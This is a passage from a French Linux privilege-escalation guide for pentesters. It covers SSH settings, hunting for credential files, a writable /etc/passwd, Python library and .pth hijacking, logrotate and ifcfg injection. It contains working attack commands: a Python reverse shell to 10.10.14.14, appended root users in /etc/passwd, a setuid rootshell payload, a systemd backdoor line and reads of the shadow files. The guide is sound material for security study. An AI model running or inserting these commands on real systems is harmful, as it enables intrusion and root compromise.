Une clé privée CA peut également être utilisable **sans être lisible** par l'utilisateur actuel si une règle de délégation de privilèges permet à cet utilisateur d'exécuter un [outil de signature de certificats tel que `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s) sans restriction, sous l'identité du propriétaire de la clé. Faites le lien entre la commande et les arguments exacts autorisés, l'accès à la clé dont dispose le compte signataire, la CA publique approuvée par la configuration effective de sshd, le principal accepté pour le compte cible, la validité du certificat et la politique de connexion de ce compte. Une commande de signature déléguée ou un fichier CA de confiance ne prouve pas à lui seul l'existence d'un accès à un autre compte ; ne signez pas de certificat de test pendant une énumération passive.

### AuthorizedKeysFile

Désigne les fichiers contenant les clés publiques utilisables pour l'authentification des utilisateurs. Il peut contenir des jetons comme `%h`, qui seront remplacés par le répertoire personnel. **Vous pouvez indiquer des chemins absolus** (commençant par `/`) ou **des chemins relatifs au répertoire personnel de l'utilisateur**. Par exemple :

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Cette configuration indiquera que si vous essayez de vous connecter avec la clé **privée** de l'utilisateur "**testusername**", ssh comparera la clé publique de votre clé à celles situées dans `/home/testusername/.ssh/authorized_keys` et `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

Le transfert de l'agent SSH vous permet d'**utiliser vos clés SSH locales au lieu de laisser des clés** (sans phrase secrète !) sur votre serveur. Vous pourrez ainsi **rebondir** via ssh **vers un hôte** et de là **rebondir vers un autre** hôte **en utilisant** la **clé** située sur votre **hôte initial**.

Vous devez définir cette option dans `$HOME/.ssh.config` comme ceci :

```
Host example.com
  ForwardAgent yes
```

Remarquez que si `Host` vaut `*`, chaque fois que l’utilisateur se connecte à une autre machine, cet hôte pourra accéder aux clés (ce qui pose un problème de sécurité).

Le fichier `/etc/ssh_config` peut **remplacer** ces **options** et autoriser ou refuser cette configuration.\
Le fichier `/etc/sshd_config` peut **autoriser** ou **refuser** le transfert de ssh-agent avec le mot-clé `AllowAgentForwarding` (autorisé par défaut).

Si vous découvrez que Forward Agent est configuré dans un environnement, consultez la page suivante, car **vous pourriez en abuser pour élever vos privilèges** :


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Fichiers intéressants

### Fichiers de profils

Le fichier `/etc/profile` et les fichiers du répertoire `/etc/profile.d/` sont des **scripts exécutés lorsqu’un utilisateur ouvre un nouveau shell**. Par conséquent, si vous pouvez **écrire dans l’un d’eux ou le modifier, vous pouvez élever vos privilèges**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Si un script de profil inhabituel est trouvé, vous devriez vérifier s’il contient des **informations sensibles**.

### Fichiers Passwd/Shadow

Selon le système d’exploitation, les fichiers `/etc/passwd` et `/etc/shadow` peuvent porter un autre nom ou avoir une sauvegarde. Il est donc recommandé de **tous les trouver** et de **vérifier si vous pouvez les lire** afin de voir **s’ils contiennent des hashes** :

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

Dans certains cas, vous pouvez trouver des **hachages de mots de passe** dans le fichier `/etc/passwd` (ou équivalent).

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### /etc/passwd modifiable en écriture

Tout d’abord, générez un mot de passe avec l’une des commandes suivantes.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Ajoutez ensuite l’utilisateur `hacker` et attribuez-lui le mot de passe généré.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Par exemple : `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Vous pouvez maintenant utiliser la commande `su` avec `hacker:hacker`

Vous pouvez également utiliser les lignes suivantes pour ajouter un utilisateur factice sans mot de passe.\
AVERTISSEMENT : vous risquez de réduire la sécurité actuelle de la machine.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

REMARQUE : Sur les plateformes BSD, `/etc/passwd` se trouve dans `/etc/pwd.db` et `/etc/master.passwd`. De plus, `/etc/shadow` est renommé en `/etc/spwd.db`.

Vérifiez si vous pouvez **écrire dans certains fichiers sensibles**. Par exemple, pouvez-vous écrire dans un **fichier de configuration d’un service** ?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Par exemple, si la machine exécute un serveur **tomcat** et que vous pouvez **modifier le fichier de configuration du service Tomcat dans /etc/systemd/,** vous pouvez modifier les lignes :

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Votre backdoor sera exécutée au prochain démarrage de Tomcat.

### Vérifier les dossiers

Les dossiers suivants peuvent contenir des sauvegardes ou des informations intéressantes : **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Vous ne pourrez probablement pas lire le dernier, mais essayez)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Emplacements inhabituels/Fichiers appartenant à l’utilisateur

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Fichiers modifiés au cours des dernières minutes

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Fichiers de bases de données SQLite

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

Pour les bases de données d’applications lisibles, examinez les noms des tables et des colonnes à la recherche de noms d’utilisateur et de hash de mots de passe. Trouver un hash, retrouver le mot de passe correspondant et démontrer sa réutilisation pour un compte local sont des étapes distinctes ; une chaîne hexadécimale générique de 32 caractères ne suffit pas à conclure qu’il s’agit de MD5 ou qu’elle donne accès à un compte.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Si un historique du shell lisible contient une commande `sudo` suivie d’une courte ligne ressemblant à un mot de passe, examinez manuellement les lignes environnantes. Un mot de passe saisi à l’invite normale de `sudo` n’est pas enregistré dans l’historique du shell ; une ligne suivante peut correspondre à une saisie accidentelle dans le shell, mais ne prouve pas qu’il s’agit d’un mot de passe valide. Le marqueur `.sudo_as_admin_successful` indique une utilisation antérieure, pas une autorisation actuelle.

### Fichiers cachés

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Scripts/binaires dans le PATH**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Fichiers Web**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Sauvegardes**

Inspectez les fichiers lisibles dans les répertoires de sauvegarde ainsi que les fichiers dont le **nom** contient `backup` : une archive au nom opaque ou avec une extension chiffrée peut tout de même exposer d’anciennes données d’application. Une archive chiffrée est seulement un élément à examiner. La récupération du mot de passe, l’inspection de son contenu, la récupération d’un hash d’application et la réutilisation de ce mot de passe pour un compte Unix sont des étapes distinctes à vérifier ; la présence d’un hash dans une archive ne prouve pas qu’il permet une connexion locale.

Les sauvegardes lisibles de machines virtuelles méritent le même examen. Une configuration VirtualBox `.vbox` peut identifier les images `.vdi` attachées et contenir les métadonnées d’une clé de disque chiffrée ; [VirtualBox indique que la clé de données chiffrée est stockée dans la configuration de la VM](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). La configuration et l’image doivent toutes deux être accessibles pour permettre l’examen hors ligne du disque. Un volume invité peut avoir sa propre [couche de chiffrement LUKS](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), qui nécessite une clé distincte. Même après un déchiffrement autorisé, d’anciens scripts ou fichiers de configuration peuvent contenir un mot de passe ; vérifiez que l’identifiant est toujours valide pour un compte hôte et que sa politique `sudo` effective permet d’exécuter une commande privilégiée avant de conclure à une escalade locale. Lors de l’énumération passive, répertoriez les chemins et les permissions sans copier, déchiffrer ni monter les images.

Lors de l’examen d’une archive lisible, listez les noms des fichiers qu’elle contient avant toute extraction : des fichiers d’authentification cachés, des codes de récupération ou des clés SSH peuvent être présents même si les copies actives sont protégées. Les noms de fichiers ne sont qu’un indice ; vérifiez séparément le contenu et toute réutilisation de compte.

Donnez la priorité aux **archives lisibles appartenant à un autre utilisateur** dans les répertoires de sauvegarde, en particulier celles appartenant à root et celles accessibles par appartenance à un groupe. Une ancienne archive peut contenir un fichier de configuration ou un secret d’authentification, même si la copie active est protégée. Pour une interface locale de gestion des sauvegardes telle que [Backrest](https://garethgeorge.github.io/backrest/), vérifiez le compte effectif du service et si un utilisateur aux privilèges inférieurs peut lire sa configuration ou s’authentifier auprès de l’interface. Ses [hooks](https://garethgeorge.github.io/backrest/docs/hooks) et son [interface de commandes restic](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) peuvent utiliser les privilèges du démon en matière de fichiers et de commandes ; le fait qu’un listener loopback soit présent ne suffit pas à déterminer l’impact. Le `passwordBcrypt` de Backrest est un hash bcrypt encodé en base64 dans son [code d’authentification](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), et non un mot de passe en clair. Confirmez l’identité du service, la validité des identifiants et l’accès au plan ou au dépôt concerné avant de considérer une archive ou une interface exposée comme une frontière de privilèges.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Fichiers connus contenant des mots de passe

Lisez le code de [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) : il recherche **plusieurs fichiers susceptibles de contenir des mots de passe**.\
**Un autre outil intéressant** que vous pouvez utiliser est [**LaZagne**](https://github.com/AlessandroZ/LaZagne), une application open source permettant de récupérer de nombreux mots de passe enregistrés sur un ordinateur local sous Windows, Linux ou Mac.

Si `/etc/guacamole/guacamole.properties` est lisible, examinez ses paramètres de connexion aux bases de données `mysql-*`, `postgresql-*` ou `sqlserver-*`. Si le compte est autorisé à lire les tables JDBC de Guacamole, `guacamole_connection_parameter` peut contenir des valeurs SSH enregistrées pour `username`, `password`, `private-key` ou `passphrase`. Commencez par examiner les ID de connexion et les noms des paramètres, puis consultez uniquement les lignes pertinentes ; une valeur enregistrée peut être un jeton dynamique ou une référence à un coffre, plutôt qu’un secret réutilisable. Consultez le [schéma JDBC de Guacamole](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) et les [paramètres de connexion SSH](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

Le gestionnaire de mots de passe [pswm](https://github.com/Julynx/pswm#usage) stocke par défaut un coffre chiffré dans `~/.local/share/pswm/pswm`. Si le coffre d’un autre utilisateur est visible, vérifiez son propriétaire et si votre compte peut réellement le lire. Le chemin du coffre ne révèle pas à lui seul les identifiants : récupérer son mot de passe maître, trouver un mot de passe de compte réutilisable et confirmer les privilèges de ce compte sont des étapes distinctes.

La [base de données par défaut de Passpie](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) se trouve dans `~/.passpie/` et contient un trousseau de clés `.keys` ainsi que des fichiers d’identifiants chiffrés `.pass` dans des répertoires de groupes. La visibilité d’un répertoire de base de données n’est qu’une piste de chemin : vérifiez l’accès à la clé et à l’entrée chiffrée concernée, toute phrase secrète principale requise, et si un identifiant récupéré appartient à un compte disposant de privilèges supérieurs. Passpie prend également en charge les [chemins de base de données personnalisés](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases) ; le chemin par défaut n’est donc pas exhaustif. L’énumération automatisée doit répertorier les métadonnées sans exporter les identifiants ni afficher le contenu des clés.

### Logs

Si vous pouvez lire les logs, vous pourrez peut-être y trouver des **informations intéressantes/confidentielles**. Plus un log est étrange, plus il sera intéressant (probablement).\
De plus, certains **logs d’audit** mal configurés (ou contenant une porte dérobée ?) peuvent vous permettre d’**enregistrer des mots de passe** dans les logs d’audit, comme l’explique cet article : [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Pour **lire les journaux, le groupe** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) sera vraiment utile.

### Fichiers shell

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Recherche générique de creds/regex

Vous devriez également rechercher les fichiers contenant le mot « **password** » dans leur **nom** ou dans leur **contenu**, ainsi que les IP et les adresses e-mail dans les logs, ou les regex de hashes.\
Je ne vais pas détailler ici comment faire tout cela, mais si cela vous intéresse, vous pouvez consulter les dernières vérifications effectuées par [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Fichiers accessibles en écriture

### Python library hijacking

Si vous savez **où** un script Python sera exécuté et que vous **pouvez écrire dans** ce dossier ou modifier les bibliothèques Python, vous pouvez modifier la bibliothèque OS et y ajouter une backdoor (si vous pouvez écrire dans le dossier où le script Python sera exécuté, copiez et collez la bibliothèque os.py).

Pour **ajouter une backdoor à la bibliothèque**, ajoutez simplement la ligne suivante à la fin de la bibliothèque os.py (modifiez l’IP et le PORT) :

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### `.pth` inscriptible traité par `site.addsitedir()`

Ne considérez pas `site.addsitedir(DIR)` comme équivalent à `sys.path.append(DIR)`. Cette fonction traite également chaque fichier `*.pth` dans `DIR`. Toute ligne commençant par `import` suivi d’une espace ou d’une tabulation est exécutée comme du code Python. Les lignes contenant des chemins sont plutôt résolues relativement au répertoire du site et ajoutées uniquement si les chemins existent.<sup>[[38]](#references)</sup>

Cela peut entraîner une privilege escalation lorsqu’un programme Python autorisé par sudo ou disposant autrement de privilèges appelle `site.addsitedir()` sur un répertoire inscriptible par l’utilisateur actuel ou par l’un de ses groupes. Le code `.pth` s’exécute pendant que le programme privilégié configure son chemin d’importation, avant que son action normale soit lancée.<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

Le contenu exécutable d’un fichier `.pth` doit tenir sur une seule ligne, mais les points-virgules permettent d’enchaîner plusieurs instructions. Par exemple, un chemin d’exécution avec les privilèges root peut créer une copie de Bash avec le bit setuid ; invoquez Bash avec `-p` pour qu’il conserve son ID effectif.<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

L’option `-S` désactive uniquement l’initialisation automatique de `site` par Python. Elle ne protège pas un programme qui importe explicitement `site` et appelle `site.addsitedir()`. Supprimez les répertoires modifiables par un attaquant des chemins d’importation privilégiés et exigez que le répertoire et ses fichiers `.pth` appartiennent exclusivement à l’administrateur privilégié, qui doit être le seul à pouvoir les modifier.<sup>[[38]](#references)[[39]](#references)</sup>

### Exploitation de logrotate

Une tâche `logrotate` privilégiée peut créer un chemin d’écriture de fichier entre utilisateurs lorsqu’elle fait effectivement la rotation d’un journal situé sous un répertoire qu’un utilisateur moins privilégié peut remplacer ou rediriger pendant la rotation. Un journal modifiable est seulement un indice. Vérifiez la règle active exacte et ses directives `create`, `olddir` et `su` ; l’identité effective du planificateur ; les droits d’écriture et de recherche sur le répertoire parent du journal ; et si la version installée et la politique autorisent le changement de destination. Un shell privilégié obtenu ultérieurement doit également charger le fichier résultant pour qu’une écriture dans un fichier de démarrage permette l’exécution de commandes. Examinez la planification, la règle, la version et le paquetage, ainsi que les métadonnées du chemin, sans déclencher de rotation ni tenter la course.

> [!TIP]
> Ne considérez pas `3.18.0` ni aucune autre chaîne de version, à elle seule, comme un seuil d’exploitabilité. Le [journal des modifications en amont](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) consigne des mesures de renforcement contre les problèmes de répertoires et de liens symboliques dans plusieurs versions, et les distributions peuvent rétroporter des correctifs. Le [manuel en amont](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) recommande `su` lorsque root fait la rotation de journaux dans des répertoires contrôlés par des utilisateurs non privilégiés ; vérifiez la règle effective et le comportement réel.

Vous trouverez des informations plus détaillées sur la vulnérabilité sur cette page : [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Vous pouvez exploiter cette vulnérabilité avec [**logrotten**](https://github.com/whotwagner/logrotten).

Cette vulnérabilité est très similaire à [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(journaux nginx)** ; par conséquent, dès que vous constatez que vous pouvez modifier des journaux, vérifiez qui les gère et si vous pouvez escalader les privilèges en remplaçant les journaux par des liens symboliques.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Référence de la vulnérabilité :** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Un fichier `ifcfg-*` est un indice à examiner lorsqu’un utilisateur moins privilégié peut le créer ou le modifier **et** qu’un chemin d’activation réseau privilégié lit précisément ce fichier. Vérifiez les permissions effectives du fichier et du répertoire, l’interface sélectionnée, l’implémentation installée de `ifup`/`ifdown` et l’identité de la personne ou du processus qui l’invoque. Un fichier modifiable ne provoque pas, à lui seul, l’exécution de code. Le [guide réseau RHEL 7 de Red Hat](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) distingue les anciens scripts réseau de NetworkManager : ce dernier ne déclenche pas lui-même les premiers. La [documentation de RHEL 8](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) indique que `ifup`/`ifdown` utilise NetworkManager par défaut, tandis que le paquet facultatif pour les anciens scripts fournit des scripts shell.

Sur un système qui utilise effectivement les anciens scripts privilégiés, une affectation `ifcfg-*` non protégée par des guillemets et interprétée par le shell, telle que `NAME=`, peut franchir une frontière d’exécution de code. Vérifiez le parseur exact, la valeur et le chemin d’activation ; ne déduisez pas une interprétation par le shell de la présence du nom de fichier ou de NetworkManager. Un wrapper autorisé par sudo qui écrit les entrées de l’appelant dans un fichier `ifcfg-*`, puis appelle l’ancien `ifup`, constitue un autre chemin vers cette frontière, même si l’appelant ne peut pas modifier directement le fichier.

Par exemple : _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Remarque : l’espace entre Network et /bin/id_)

### **init, init.d, systemd et rc.d**

Le répertoire `/etc/init.d` contient les **scripts** de System V init (SysVinit), le **système classique de gestion des services sous Linux**. Il comprend des scripts permettant de `start`, `stop`, `restart` et parfois `reload` des services. Ceux-ci peuvent être exécutés directement ou via des liens symboliques présents dans `/etc/rc?.d/`. Sur les systèmes Redhat, un autre chemin est `/etc/rc.d/init.d`.

En revanche, `/etc/init` est associé à **Upstart**, un système de **gestion des services** plus récent, introduit par Ubuntu, qui utilise des fichiers de configuration pour gérer les services. Malgré la transition vers Upstart, les scripts SysVinit continuent d’être utilisés parallèlement aux configurations Upstart grâce à une couche de compatibilité intégrée à Upstart.

**systemd** est un gestionnaire moderne d’initialisation et de services qui offre des fonctionnalités avancées telles que le démarrage des daemons à la demande, la gestion de l’automontage et les instantanés de l’état du système. Il organise les fichiers dans `/usr/lib/systemd/` pour les paquets de la distribution et dans `/etc/systemd/system/` pour les modifications de l’administrateur, ce qui simplifie l’administration du système.<sup>[[21]](#references)</sup>

## Autres astuces

### Élévation de privilèges via NFS


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Échapper aux shells restreints


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Frameworks de rooting Android : abus du canal du gestionnaire

Les frameworks de rooting Android interceptent généralement un syscall pour exposer des fonctionnalités privilégiées du kernel à un gestionnaire en espace utilisateur. Une authentification faible du gestionnaire (par exemple, des vérifications de signature basées sur l’ordre des FD ou des mots de passe peu robustes) peut permettre à une application locale d’usurper l’identité du gestionnaire et d’obtenir les privilèges root sur des appareils déjà rootés. Pour en savoir plus et découvrir les détails de l’exploitation :


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Découverte de services VMware Tools et LPE (CWE-426) via une exécution basée sur regex (CVE-2025-41244)

La découverte de services pilotée par regex dans VMware Tools/Aria Operations peut extraire un chemin de binaire depuis les lignes de commande des processus, puis l’exécuter avec -v dans un contexte privilégié. Des patterns permissifs (par exemple, l’utilisation de \S) peuvent correspondre à des listeners placés par un attaquant dans des emplacements accessibles en écriture (par exemple, /tmp/httpd), entraînant une exécution en tant que root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Pour en savoir plus et découvrir un modèle généralisé applicable à d’autres piles de découverte et de supervision :


{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Protections de sécurité du kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Aide supplémentaire

[Binaries statiques d’impacket](https://github.com/ropnop/impacket_static_binaries)

## Outils d’élévation de privilèges Linux/Unix

### **Meilleur outil pour rechercher des vecteurs d’élévation locale de privilèges sous Linux :** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum** : [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(option -t)\
**Enumy** : [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Vérification d’élévation de privilèges Unix :** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker :** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot :** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop :** Énumération des vulnérabilités du kernel sous Linux et MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit :** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester :** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (accès physique) :** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Compilation d’autres scripts** : [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (élévation de privilèges via l’interface Crontab, réutilisation des identifiants zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era : payload .text_sig falsifié pour un moniteur exécuté par cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025 : contournement de Neighborhood Watch (détournement du PATH via sudo env_keep)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Élévation de privilèges Linux de base](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Guide d’élévation de privilèges Linux](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Attaque et défense : techniques d’élévation de privilèges Linux de 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Personne ne s’attend à une exécution de commande !](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (élévation de privilèges Linux)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Parcours des exercices de laboratoire - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation : astuces pour l’élévation de privilèges Linux](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i : outil d’énumération et d’élévation de privilèges Linux](https://github.com/rtcrowley/linux-private-i)
- [14] [Qu’est-ce qu’un socket ?](https://www.linux.com/news/what-socket/)
- [15] [Solution de Peppo (Proving Grounds)](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Découvrir le D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Élévation de privilèges Linux via des exécutables SUID](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo, partie 2 – Élévation de privilèges Linux](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Comment gérer les ACL sous Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Redhat/CentOS : accès root via network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [Qu’est-ce que systemd ?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (injection arithmétique bash via les logs, chaîne complète)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [Manuel GNU Bash – BASH_ENV (fichier de démarrage non interactif)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + élévation de privilèges via un lien symbolique TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (copie cron pg_basebackup → bash SUID)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Vous le nommez, VMware l’élève (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463 : élévation de privilèges Sudo via chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – Vulnérabilités d’élévation de privilèges Sudo CVE-2025-32462 et CVE-2025-32463](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
